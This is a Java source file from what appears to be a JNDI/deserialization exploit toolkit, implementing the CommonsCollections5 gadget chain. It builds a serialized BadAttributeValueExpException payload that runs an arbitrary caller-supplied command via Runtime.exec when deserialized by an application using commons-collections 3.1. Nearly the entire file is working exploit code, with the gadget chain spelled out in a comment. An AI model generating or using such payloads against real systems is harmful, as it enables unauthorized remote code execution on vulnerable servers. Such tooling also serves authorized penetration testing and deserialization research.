package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.JavaVersion;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 * BadAttributeValueExpException.readObject()
 * TiedMapEntry.toString()
 * LazyMap.get()
 * ChainedTransformer.transform()
 * ConstantTransformer.transform()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Class.getMethod()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.getRuntime()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.exec()
 * <p>
 * Requires:
 * commons-collections
 */

@SuppressWarnings({"rawtypes", "unused"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
public class CommonsCollections5 implements ObjectPayload<BadAttributeValueExpException> {

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public BadAttributeValueExpException getObject(String command) throws Exception {

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[]           transformers = TransformerUtil.makeTransformer(command);
        final Map                     innerMap     = new HashMap();
        final Map                     lazyMap      = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry                  entry        = new TiedMapEntry(lazyMap, "QI4L");
        BadAttributeValueExpException val          = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", entry);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    }
}
